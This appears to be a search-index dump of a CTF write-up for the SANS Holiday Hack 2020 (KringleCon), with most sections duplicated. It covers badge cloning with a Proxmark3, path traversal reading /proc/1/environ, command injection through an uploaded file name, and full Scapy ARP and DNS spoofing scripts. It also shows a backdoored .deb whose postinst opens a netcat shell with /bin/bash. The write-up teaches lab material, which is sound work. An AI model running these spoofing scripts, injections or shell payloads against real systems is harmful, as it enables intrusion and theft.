located on the \"Netwars level\" (the roof) near Wunorse Openslae. Configure the panel as such to fully power it. Here is how the closed panel looks: The final Elevator 1.5 Button is in the \"Speaker Unprep\" room. You need to solve another challenge to access this room. This button is not required to complete this objective.","title":"Walk-through"},{"location":"obj/objective4/#answer","text":"Here is a table that shows the location of all the items required for solving the Santavator: Item Location Elevator Service Key Sparkle Redberry Green Bulb Courtyard (top left) Hex Bolt Dining Room Hex Bolt Entryway by Elevator Broken Candycane Front Lawn (near the passage to Entry) Red Bulb Talks Level Lobby near Chimney Scissorsticks Yellow Bulb Netwars level near Wunorse Openslae Configure the panel as such to fully power it.","title":"Answer"},{"location":"obj/objective5/","text":"Objective 5 - Open HID Lock \u00b6 Objective \u00b6 The HID lock is located in Santa's Workshop. Walk-through \u00b6 There are two terminal challenges for this objective: \"33.6kbps\" offered by Fitzy Shortstack (located in the Kitchen). \"Speaker UNPrep\" offered by Bushy Evergreen (located in the Talks Level). Solving these terminal challenges provides additional hints for this objective. To view the hints or the walk-through for these terminal challenges, use the menu on the left. To start this objective you need to go to the workshop. You need to go to the wrapping room that is located above the workshop. In the wrapping room, you will find the item Proxmark3 on the floor. Based on the hints from the terminal challenges, you need to use the Proxmark3 to read the hid code from a specific character and simulate it at the HID Lock to unlock it. You can interact with the Proxmark3 from the items menu. Explore the castle and each time you're standing near a character, type lf hid read in the Proxmark3 console. Here are the hids for some of the characters in the castle: Noel Boetie #db# TAG ID: 2006e22ee1 (6000) - Format Len: 26 bit - FC: 113 - Card: 6000 Bow Ninecandle #db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023 Sparkle Redberry/Ginger Breddie #db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022 Holly Evergreen/Fitzy Shortstack #db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024 Shinny Upatree #db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 One of the hints is that Santa trusts Shinny Upatree (located on the front lawn). Once you have Shinny's HID TAG ID, go to the workshop and replay the TAG using the command: LF hid sim -r 2006e22f13 As you walk through the unlocked door, you see a set of eyes at the end of the hallway. Clicking on the eyes transports you into Santa's body in the entryway. Answer \u00b6 Find the Proxmark3 in Wrapping Room inside of Workshop. Read Shinny Upatree TAG ID using the Proxmark3 with the command lf hid read . Simulate Shinny Upatree TAG using the Proxmark3 with the command LF hid sim -r 2006e22f13 .","title":"5) Open HID Lock"},{"location":"obj/objective5/#objective-5-open-hid-lock","text":"","title":"Objective 5 - Open HID Lock"},{"location":"obj/objective5/#objective","text":"The HID lock is located in Santa's Workshop.","title":"Objective"},{"location":"obj/objective5/#walk-through","text":"There are two terminal challenges for this objective: \"33.6kbps\" offered by Fitzy Shortstack (located in the Kitchen). \"Speaker UNPrep\" offered by Bushy Evergreen (located in the Talks Level). Solving these terminal challenges provides additional hints for this objective. To view the hints or the walk-through for these terminal challenges, use the menu on the left. To start this objective you need to go to the workshop. You need to go to the wrapping room that is located above the workshop. In the wrapping room, you will find the item Proxmark3 on the floor. Based on the hints from the terminal challenges, you need to use the Proxmark3 to read the hid code from a specific character and simulate it at the HID Lock to unlock it. You can interact with the Proxmark3 from the items menu. Explore the castle and each time you're standing near a character, type lf hid read in the Proxmark3 console. Here are the hids for some of the characters in the castle: Noel Boetie #db# TAG ID: 2006e22ee1 (6000) - Format Len: 26 bit - FC: 113 - Card: 6000 Bow Ninecandle #db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023 Sparkle Redberry/Ginger Breddie #db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022 Holly Evergreen/Fitzy Shortstack #db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024 Shinny Upatree #db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 One of the hints is that Santa trusts Shinny Upatree (located on the front lawn). Once you have Shinny's HID TAG ID, go to the workshop and replay the TAG using the command: LF hid sim -r 2006e22f13 As you walk through the unlocked door, you see a set of eyes at the end of the hallway. Clicking on the eyes transports you into Santa's body in the entryway.","title":"Walk-through"},{"location":"obj/objective5/#answer","text":"Find the Proxmark3 in Wrapping Room inside of Workshop. Read Shinny Upatree TAG ID using the Proxmark3 with the command lf hid read . Simulate Shinny Upatree TAG using the Proxmark3 with the command LF hid sim -r 2006e22f13 .","title":"Answer"},{"location":"obj/objective6/","text":"Objective 6 - Splunk Challenge \u00b6 Objective \u00b6 The Splunk Challenge is offered by Angel Candysalt in the \"Great Room\". You have to be in Santa's Body to be able to do this challenge. If you're not sure how to enter Santa's Body, refer to Objective 5 write-up. Walk-through \u00b6 To start this objective go to the \"Great Room\" as Santa. Refer to Objective 5 walk-through if you're not sure how to enter Santa's Body. Click on the Splunk PC to start this objective. This redirects you to the splunk website for this challenge. Instead of a hint, this objective contains training questions. The training questions, train users to be able to answer the \"Challenge Question\". There is a talk available for this objective. Training Question 1 \u00b6 1) How many distinct MITRE ATT&CK techniques did Alice emulate? You can find all the attack types following search: index=T*| top limit=200 index | fields index Filter the above and remove the duplicates and sub attacks. There are 13 distinct attacks. Alice Bluebird shares this command with us that also gives the solution: | tstats count where index=* by index | search index=T*-win OR T*-main | rex field=index \"(?<technique>t\\d+)[\\.\\-].0*\" | stats dc(technique) Answer: 13 Training Question 2 \u00b6 2) What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) Search for index=t1059.003* . Click on the index field in the left toolbar of the results. Two values are displayed, t1059.003-main and t1059.003-win . Answer: t1059.003-main t1059.003-win Training Question 3 \u00b6 3) One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? Alice Bluebird provides the link for Atomic Red Team GitHub repo. Search this repo for \"MachineGuid\". The registry key is shown in the results. Answer: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography Training Question 4 \u00b6 4) According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) Search for index=attack field5=\"ostap*\" and look at the earliest attack timestamp in UTC. Answer: 2020-11-30T17:44:15Z Training Question 5 \u00b6 5) One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? Review the frgnca GitHub repo. The only repo that is related to windows is a repo called AudioDeviceCmdlets . Search for index=* CommandLine=\"*audio*\" to find the ProcessId. Answer: 3648 Training Question 6 \u00b6 6) Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? Search for index=* CommandLine=\"*.bat*\" . Add the field CommandLine to the result table. Search and review the .bat files in the results. You will see the following .bat file in the results: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat Viewing this batch file shows the last line is quser . Answer: quser Training Question 7 \u00b6 7) According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? For this question we get the following hint: Search for index=* sourcetype=bro* sourcetype=\"bro:x509:json\" . Reviewing the results you find the serial number for win-dc-748.attackrange.local. Answer: 55FCEEBB21270D9249E86F4B9DC7AA60 Challenge Question \u00b6 7) What is the name of the adversary group that Santa feared would attack KringleCon? For this question you receive the following message from Alice Bluebird: Ciphertext: 7FXjP1lyfKbyDK/MChyf36h7 RFC 7465 refers to RC4. It mentions that the secret code is Santa's favorite phrase. From the Talk for this objective, you know this phrase is \"Stay Frosty\". Use CyberChef to decode the adversary group name. Answer: The Lollipop Guild Answer \u00b6 The name of the adversary group that Santa feared would attack the KringleCon is The Lollipop Guild .","title":"6) Splunk Challenge"},{"location":"obj/objective6/#objective-6-splunk-challenge","text":"","title":"Objective 6 - Splunk Challenge"},{"location":"obj/objective6/#objective","text":"The Splunk Challenge is offered by Angel Candysalt in the \"Great Room\". You have to be in Santa's Body to be able to do this challenge. If you're not sure how to enter Santa's Body, refer to Objective 5 write-up.","title":"Objective"},{"location":"obj/objective6/#walk-through","text":"To start this objective go to the \"Great Room\" as Santa. Refer to Objective 5 walk-through if you're not sure how to enter Santa's Body. Click on the Splunk PC to start this objective. This redirects you to the splunk website for this challenge. Instead of a hint, this objective contains training questions. The training questions, train users to be able to answer the \"Challenge Question\". There is a talk available for this objective.","title":"Walk-through"},{"location":"obj/objective6/#training-question-1","text":"1) How many distinct MITRE ATT&CK techniques did Alice emulate? You can find all the attack types following search: index=T*| top limit=200 index | fields index Filter the above and remove the duplicates and sub attacks. There are 13 distinct attacks. Alice Bluebird shares this command with us that also gives the solution: | tstats count where index=* by index | search index=T*-win OR T*-main | rex field=index \"(?<technique>t\\d+)[\\.\\-].0*\" | stats dc(technique) Answer: 13","title":"Training Question 1"},{"location":"obj/objective6/#training-question-2","text":"2) What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) Search for index=t1059.003* . Click on the index field in the left toolbar of the results. Two values are displayed, t1059.003-main and t1059.003-win . Answer: t1059.003-main t1059.003-win","title":"Training Question 2"},{"location":"obj/objective6/#training-question-3","text":"3) One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? Alice Bluebird provides the link for Atomic Red Team GitHub repo. Search this repo for \"MachineGuid\". The registry key is shown in the results. Answer: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography","title":"Training Question 3"},{"location":"obj/objective6/#training-question-4","text":"4) According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) Search for index=attack field5=\"ostap*\" and look at the earliest attack timestamp in UTC. Answer: 2020-11-30T17:44:15Z","title":"Training Question 4"},{"location":"obj/objective6/#training-question-5","text":"5) One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? Review the frgnca GitHub repo. The only repo that is related to windows is a repo called AudioDeviceCmdlets . Search for index=* CommandLine=\"*audio*\" to find the ProcessId. Answer: 3648","title":"Training Question 5"},{"location":"obj/objective6/#training-question-6","text":"6) Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? Search for index=* CommandLine=\"*.bat*\" . Add the field CommandLine to the result table. Search and review the .bat files in the results. You will see the following .bat file in the results: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat Viewing this batch file shows the last line is quser . Answer: quser","title":"Training Question 6"},{"location":"obj/objective6/#training-question-7","text":"7) According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? For this question we get the following hint: Search for index=* sourcetype=bro* sourcetype=\"bro:x509:json\" . Reviewing the results you find the serial number for win-dc-748.attackrange.local. Answer: 55FCEEBB21270D9249E86F4B9DC7AA60","title":"Training Question 7"},{"location":"obj/objective6/#challenge-question","text":"7) What is the name of the adversary group that Santa feared would attack KringleCon? For this question you receive the following message from Alice Bluebird: Ciphertext: 7FXjP1lyfKbyDK/MChyf36h7 RFC 7465 refers to RC4. It mentions that the secret code is Santa's favorite phrase. From the Talk for this objective, you know this phrase is \"Stay Frosty\". Use CyberChef to decode the adversary group name. Answer: The Lollipop Guild","title":"Challenge Question"},{"location":"obj/objective6/#answer","text":"The name of the adversary group that Santa feared would attack the KringleCon is The Lollipop Guild .","title":"Answer"},{"location":"obj/objective7/","text":"Objective 7 - Solve the Sleigh's CAN-D-BUS Problem \u00b6 Objective \u00b6 The Sleigh CAN-D-BUS is on the roof (Netwars Level). The terminal challenge for this objective is CAN-Bus Investigation, which is offered by Wunorse Openslae. Walk-through \u00b6 Solving the terminal challenge CAN-Bus Investigation provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective, go to the roof and click on \"Sleigh CAN-D-BUS \". This action will open the live console for the Sleigh CAN-D-BUS system. It displays the controls and live output of Epoch Time and ID Message (CAN BUS ID Codes). You need to use the filter to remove Jack's malicious messages. Start this challenge by filtering everything out that is automatically generated. You want to manipulate the controls one at a time to find the corresponding Messages ID. Here is what you can exclude to filter out the automatic messages: Press different controls to identify the Message ID for each of the controls. Once you identified most of the controls with the above filters, start removing the filters one at a time. Each time, try to identify any additional Message IDs for the controls. Here are the Message IDs for the controls: Lock - 19B#000000000000 Unlock - 19B#00000F000000 Stop - 02A#0000FF Start - 02A#00FF00 Steering - 19#HEXVALUE Break - 080#HEXVALUE Heartbeat? - 188 Accelerator - 244#HEXVALUE By manipulating each control you can find the acceptable hex values for each control. The break acceptable value is between 0x000000 - 0x000064 (0-100). The unlock acceptable hex values is 00000F000000 . Using this information, create exclusions to filter out the invalid values. Answer \u00b6 Exclude 19B Equals 0000000F2057 Exclude 080 Contains FFFFF","title":"7) Solve the Sleigh's CAN-D-BUS Problem"},{"location":"obj/objective7/#objective-7-solve-the-sleighs-can-d-bus-problem","text":"","title":"Objective 7 - Solve the Sleigh's CAN-D-BUS Problem"},{"location":"obj/objective7/#objective","text":"The Sleigh CAN-D-BUS is on the roof (Netwars Level). The terminal challenge for this objective is CAN-Bus Investigation, which is offered by Wunorse Openslae.","title":"Objective"},{"location":"obj/objective7/#walk-through","text":"Solving the terminal challenge CAN-Bus Investigation provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective, go to the roof and click on \"Sleigh CAN-D-BUS \". This action will open the live console for the Sleigh CAN-D-BUS system. It displays the controls and live output of Epoch Time and ID Message (CAN BUS ID Codes). You need to use the filter to remove Jack's malicious messages. Start this challenge by filtering everything out that is automatically generated. You want to manipulate the controls one at a time to find the corresponding Messages ID. Here is what you can exclude to filter out the automatic messages: Press different controls to identify the Message ID for each of the controls. Once you identified most of the controls with the above filters, start removing the filters one at a time. Each time, try to identify any additional Message IDs for the controls. Here are the Message IDs for the controls: Lock - 19B#000000000000 Unlock - 19B#00000F000000 Stop - 02A#0000FF Start - 02A#00FF00 Steering - 19#HEXVALUE Break - 080#HEXVALUE Heartbeat? - 188 Accelerator - 244#HEXVALUE By manipulating each control you can find the acceptable hex values for each control. The break acceptable value is between 0x000000 - 0x000064 (0-100). The unlock acceptable hex values is 00000F000000 . Using this information, create exclusions to filter out the invalid values.","title":"Walk-through"},{"location":"obj/objective7/#answer","text":"Exclude 19B Equals 0000000F2057 Exclude 080 Contains FFFFF","title":"Answer"},{"location":"obj/objective8/","text":"Objective 8 - Broken Tag Generator \u00b6 Objective \u00b6 The Tag Generator can be accessed here . The terminal challenge for this objective is Redis Bug Hunt which is offered by Holly Evergreen. Walk-through \u00b6 Solving the terminal challenge, Redis Bug Hunt, provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective go to the Tag Generator website . From the hints, you know that the error messages will leak useful information. Click on \"Select File(s)\" and upload a .txt file. This tells you the application is located at /app/lib/app.rb . Upload a valid .png file. Use Chrome Developer mode to identify the location of the uploaded .png file. The uploaded images can be accessed at the following address: https://tag-generator.kringlecastle.com/image?id=<UID> Use a path traversal ../../../../app/lib/app.rb to download the app.rb file. https://tag-generator.kringlecastle.com/image?id=../../../../app/lib/app.rb The website returns app.rb encoded in Base64. The path traversal provides the ability to download files from the system. The environment variables for the system can be downloaded with this ability. Environment variables are located in /etc/environment or /proc/<PID>/environ . The Tag generator returns a blank response when you try to download /etc/environment . The PID for system process is 1. Use the following link to read the environment variables on the system. https://tag-generator.kringlecastle.com/image?id=../../../../proc/1/environ The above request returns the environment variables encoded in Base64. You can view the results here . RCE Method \u00b6 You can also solve this objective via Remote Code Execution (RCE). If you review the code, you notice two comment blocks by Jack. These are the blocks that introduce two vulnerabilities. The second block is the vulnerability we used for downloading files through the image endpoint. The first one creates the RCE vulnerability. # I wonder what this will do? --Jack # if entry.name !~ /^[a-zA-Z0-9._-]+$/ # raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen' # end # Validation is boring! --Jack # if params['id'] !~ /^[a-zA-Z0-9._-]+$/ # return 400, 'Invalid id! id may contain letters, numbers, period, underscore, and hyphen' # end To exploit the RCE, create an image that is larger than 800x600. Give this image the following name ';printevn > printevn2.txt;'.png . Zip this image up and upload it. Wait a few minutes and then download the results, using the file download vulnerability. Answer \u00b6 JackFrostWasHere","title":"8) Broken Tag Generator"},{"location":"obj/objective8/#objective-8-broken-tag-generator","text":"","title":"Objective 8 - Broken Tag Generator"},{"location":"obj/objective8/#objective","text":"The Tag Generator can be accessed here . The terminal challenge for this objective is Redis Bug Hunt which is offered by Holly Evergreen.","title":"Objective"},{"location":"obj/objective8/#walk-through","text":"Solving the terminal challenge, Redis Bug Hunt, provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective go to the Tag Generator website . From the hints, you know that the error messages will leak useful information. Click on \"Select File(s)\" and upload a .txt file. This tells you the application is located at /app/lib/app.rb . Upload a valid .png file. Use Chrome Developer mode to identify the location of the uploaded .png file. The uploaded images can be accessed at the following address: https://tag-generator.kringlecastle.com/image?id=<UID> Use a path traversal ../../../../app/lib/app.rb to download the app.rb file. https://tag-generator.kringlecastle.com/image?id=../../../../app/lib/app.rb The website returns app.rb encoded in Base64. The path traversal provides the ability to download files from the system. The environment variables for the system can be downloaded with this ability. Environment variables are located in /etc/environment or /proc/<PID>/environ . The Tag generator returns a blank response when you try to download /etc/environment . The PID for system process is 1. Use the following link to read the environment variables on the system. https://tag-generator.kringlecastle.com/image?id=../../../../proc/1/environ The above request returns the environment variables encoded in Base64. You can view the results here .","title":"Walk-through"},{"location":"obj/objective8/#rce-method","text":"You can also solve this objective via Remote Code Execution (RCE). If you review the code, you notice two comment blocks by Jack. These are the blocks that introduce two vulnerabilities. The second block is the vulnerability we used for downloading files through the image endpoint. The first one creates the RCE vulnerability. # I wonder what this will do? --Jack # if entry.name !~ /^[a-zA-Z0-9._-]+$/ # raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen' # end # Validation is boring! --Jack # if params['id'] !~ /^[a-zA-Z0-9._-]+$/ # return 400, 'Invalid id! id may contain letters, numbers, period, underscore, and hyphen' # end To exploit the RCE, create an image that is larger than 800x600. Give this image the following name ';printevn > printevn2.txt;'.png . Zip this image up and upload it. Wait a few minutes and then download the results, using the file download vulnerability.","title":"RCE Method"},{"location":"obj/objective8/#answer","text":"JackFrostWasHere","title":"Answer"},{"location":"obj/objective9/","text":"Objective 9 - ARP Shenanigans \u00b6 Objective \u00b6 The ARP Shenanigans is located on the roof (Netwars room). The terminal challenge for this objective is Scapy Prepper which is offered by Alabaster Snowball. Walk-through \u00b6 Solving the terminal challenge Scapy Prepper provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective go to the roof and click on the ARP Shenanigans. View additional tips by typing cat HELP.md . Add an additional Terminal Pane by following command: /usr/bin/tmux split-window -hb Now you have a total of four terminals. Resize the terminals so you can view all four. Tip: To resize terminals use Ctrl+B Up/Down Arrow, and to switch terminals use CTRL+B o. In one of the terminals start a packet capture by running the following command: tcpdump -nni eth0 This will show the ARP requests from the compromised device (10.6.6.35). The compromised device is looking for the MAC address of a device with IP 10.6.6.53. You need to send a spoofed ARP response for IP address 10.6.6.53 to the compromised device. In another word, you need to send a packet to the compromised device, pretending to be 10.6.6.53, but providing your actual MAC address. This will poison the ARP on the compromised device and will cause it to send packets destined for 10.6.6.53 to your MAC address. Use nano or VIM to edit the sample arp responder script /scripts/arp_resp.py . By examining the sample PCAP file in the /pcaps/ folder you can find the proper values for plen , op , hwlen , ptype , hwtype . Update the /scripts/arp_resp.py to look like this: #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni . ifaddresses ( 'eth0' )[ ni . AF_INET ][ 0 ][ 'addr' ] # Our eth0 mac address macaddr = ':' . join ([ ' {:02x} ' . format (( uuid . getnode () >> i ) & 0xff ) for i in range ( 0 , 8 * 6 , 8 )][:: - 1 ]) def handle_arp_packets ( packet ): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet [ ARP ] . op == 1 : ether_resp = Ether ( dst = packet . src , type = 0x806 , src = macaddr ) arp_response = ARP ( pdst = packet . psrc ) arp_response . op = 2 arp_response . plen = 4 arp_response . hwlen = 6 arp_response . ptype = 0x800 arp_response . hwtype = 1 arp_response . hwsrc = macaddr arp_response . psrc = packet . pdst arp_response . hwdst = packet . src arp_response . pdst = packet . psrc response = ether_resp / arp_response sendp ( response , iface = \"eth0\" ) def main (): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff ( filter = berkeley_packet_filter , prn = handle_arp_packets , store = 0 , count = 1 ) if __name__ == \"__main__\" : main () Test run arp_resp.py . The compromised device should send you a DNS request for ftp.osuosl.org after you run arp_resp.py . You need to respond to the DNS request with your IP address. For this use the sample dns_resp.py provided in the scripts folder. Update the sample dns_resp.py script as follow: #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni . ifaddresses ( 'eth0' )[ ni . AF_INET ][ 0 ][ 'addr' ] # Our Mac Addr macaddr = ':' . join ([ ' {:02x} ' . format (( uuid . getnode () >> i ) & 0xff ) for i in range ( 0 , 8 * 6 , 8 )][:: - 1 ]) # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request ( packet ): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether ( src = packet . dst , dst = packet . src ) # need to replace mac addresses ip = IP ( dst = packet [ IP ] . src , src = packet [ IP ] . dst ) # need to replace IP addresses udp = UDP ( dport = packet [ IP ] . sport , sport = 53 ) # need to replace ports dns = DNS ( # MISSING DNS RESPONSE LAYER VALUES id = packet [ DNS ] . id , qr = 1 , qd = DNSQR ( qname = packet [ DNSQR ] . qname ), an = DNSRR ( rrname = packet [ DNSQR ] . qname , rdata = ipaddr ) ) dns_response = eth / ip / udp / dns sendp ( dns_response , iface = \"eth0\" ) def main (): berkeley_packet_filter = \" and \" . join ( [ \"udp dst port 53\" , # dns \"udp[10] & 0x80 = 0\" , # dns request \"dst host {} \" . format ( ipaddr_we_arp_spoofed ), # destination ip we had spoofed (not our real ip) \"ether dst host {} \" . format ( macaddr ) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff ( filter = berkeley_packet_filter , prn = handle_dns_request , store = 0 , iface = \"eth0\" , count = 1 ) if __name__ == \"__main__\" : main () Run the updated dns_resp.py in one of the terminals. In another terminal, run python3 -m http.server 80 . In another terminal, run the updated arp_resp.py . This will cause the compromised device to connect to our webserver. It will look something like this: From the http server logs you can see the compromised device is trying to download this specific file: /pub/jfrost/backdoor/suriv_amd64.deb You need to create a suriv_amd64.deb package so the compromised device runs it. Tip: How to unpack/repack .deb packages Run the following commands to extract the netcat package that is provided in the /debs/ folder: mkdir tmp dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp cd tmp Add the following lines to bottom of postinst file with nano or Vim: nc -n -v -l -p 4444 -e /bin/bash Use the following command to build the suriv_amd64.deb package: cd .. dpkg-deb -b tmp suriv_amd64.deb Copy the package to the proper folder using the following command: cp suriv_amd64.deb ./pub/jfrost/backdoor/ Rerun dns_responder.py , python3 -m http.server 80 , and arp_responder.py in 3 different terminals (in that order). Wait a few min and then run nc -nv 10.6.6.35 4444 in one of the terminals to connect to the compromised device. If everything works you should get a shell back that looks like this: As the terminal window is small, you need run the following commands to extract the file 15 lines at a time: sed -n 1,15p NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt sed -n 15,30p NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt sed -n 30,45p NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt sed -n 45,60p NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt sed -n 60-75p NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt If you have a bigger display you can simply run cat NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt You can see the following people attended the meeting: You can see the following people voted in the meeting: The person who attended the meeting but did not vote is Tanta Kringle . Answer \u00b6 Tanta Kringle","title":"9) ARP Shenanigans"},{"location":"obj/objective9/#objective-9-arp-shenanigans","text":"","title":"Objective 9 - ARP Shenanigans"},{"location":"obj/objective9/#objective","text":"The ARP Shenanigans is located on the roof (Netwars room). The terminal challenge for this objective is Scapy Prepper which is offered by Alabaster Snowball.","title":"Objective"},{"location":"obj/objective9/#walk-through","text":"Solving the terminal challenge Scapy Prepper provides additional hints for this objective. To view the hints or the walk-through for this terminal challenge, use the menu on the left. To start this objective go to the roof and click on the ARP Shenanigans. View additional tips by typing cat HELP.md . Add an additional Terminal Pane by following command: /usr/bin/tmux split-window -hb Now you have a total of four terminals. Resize the terminals so you can view all four. Tip: To resize terminals use Ctrl+B Up/Down Arrow, and to switch terminals use CTRL+B o. In one of the terminals start a packet capture by running the following command: tcpdump -nni eth0 This will show the ARP requests from the compromised device (10.6.6.35). The compromised device is looking for the MAC address of a device with IP 10.6.6.53. You need to send a spoofed ARP response for IP address 10.6.6.53 to the compromised device. In another word, you need to send a packet to the compromised device, pretending to be 10.6.6.53, but providing your actual MAC address. This will poison the ARP on the compromised device and will cause it to send packets destined for 10.6.6.53 to your MAC address. Use nano or VIM to edit the sample arp responder script /scripts/arp_resp.py . By examining the sample PCAP file in the /pcaps/ folder you can find the proper values for plen , op , hwlen , ptype , hwtype . Update the /scripts/arp_resp.py to look like this: #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni . ifaddresses ( 'eth0' )[ ni . AF_INET ][ 0 ][ 'addr' ] # Our eth0 mac address macaddr = ':' . join ([ ' {:02x} ' . format (( uuid . getnode () >> i ) & 0xff ) for i in range ( 0 , 8 * 6 , 8 )][:: - 1 ]) def handle_arp_packets ( packet ): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet [ ARP ] . op == 1 : ether_resp = Ether ( dst = packet . src , type = 0x806 , src = macaddr ) arp_response = ARP ( pdst = packet . psrc ) arp_response . op = 2 arp_response . plen = 4 arp_response . hwlen = 6 arp_response . ptype = 0x800 arp_response . hwtype = 1 arp_response . hwsrc = macaddr arp_response . psrc = packet . pdst arp_response . hwdst = packet . src arp_response . pdst = packet . psrc response = ether_resp / arp_response sendp ( response , iface = \"eth0\" ) def main (): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff ( filter = berkeley_packet_filter , prn = handle_arp_packets , store = 0 , count = 1 ) if __name__ == \"__main__\" : main () Test run arp_resp.py . The compromised device should send you a DNS request for ftp.osuosl.org after you run arp_resp.py . You need to respond to the DNS request with your IP address. For this use the sample dns_resp.py provided in the scripts folder. Update the sample dns_resp.py script as follow: #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni . ifaddresses ( 'eth0' )[ ni . AF_INET ][ 0 ][ 'addr' ] # Our Mac Addr macaddr = ':' . join ([ ' {:02x} ' . format (( uuid . getnode () >> i ) & 0xff ) for i in range ( 0 , 8 * 6 , 8 )][:: - 1 ]) # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request ( packet ): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether ( src = packet . dst , dst = packet . src ) # need to replace mac addresses ip = IP ( dst = packet [ IP ] . src , src = packet [ IP ] . dst ) # need to replace IP addresses udp = UDP ( dport = packet [ IP ] . sport , sport = 53 ) # need to replace ports dns = DNS ( # MISSING DNS RESPONSE LAYER VALUES id = packet [ DNS ] . id , qr = 1 , qd = DNSQR ( qname = packet [ DNSQR ] . qname ), an = DNSRR ( rrname = packet [ DNSQR ] . qname , rdata = ipaddr ) ) dns_response = eth / ip / udp / dns sendp ( dns_response , iface = \"eth0\" ) def main (): berkeley_packet_filter = \" and \" . join ( [ \"udp dst port 53\" , # dns \"udp[10] & 0x80 = 0\" , # dns request \"dst host {} \" . format ( ipaddr_we_arp_spoofed ), # destination ip we had spoofed (not our real ip) \"ether dst host {} \" . format ( macaddr ) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff ( filter = berkeley_packet_filter , prn = handle_dns_request , store = 0 , iface = \"eth0\" , count = 1 ) if __name__ == \"__main__\" : main () Run the updated dns_resp.py in one of the terminals. In another terminal, run python3 -m http.server 80 . In another terminal, run the updated arp_resp.py . This will cause the compromised device to connect to our webserver. It will look something like this: From the http server logs you can see the compromised device is trying to download this specific file: /pub/jfrost/backdoor/suriv_amd64.deb You need to create a suriv_amd64.deb package so the compromised device runs it. Tip: How to unpack/repack .deb packages Run the following commands to extract the netcat package that is provided in the /debs/ folder: mkdir tmp dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp cd tmp Add the following lines to bottom of postinst file with nano or Vim: nc -n -v -l -p 4444 -e /bin/bash Use the following command to build the suriv_amd64.deb package: cd .. dpkg-deb -b tmp suriv_amd64.deb Copy the package to the proper folder using the following command: cp suriv_amd64.deb ./pub/jfrost/backdoor/ Rerun dns_responder.py , python3 -m http.server 80 , and arp_responder.py in 3 different terminals (in that order). Wait a few min and then run nc -nv 10.6.6.35 4444 in one of the terminals to connect to the compromised device. If everything works you should get a shell back that looks like this: As the terminal window is small, you need run the following 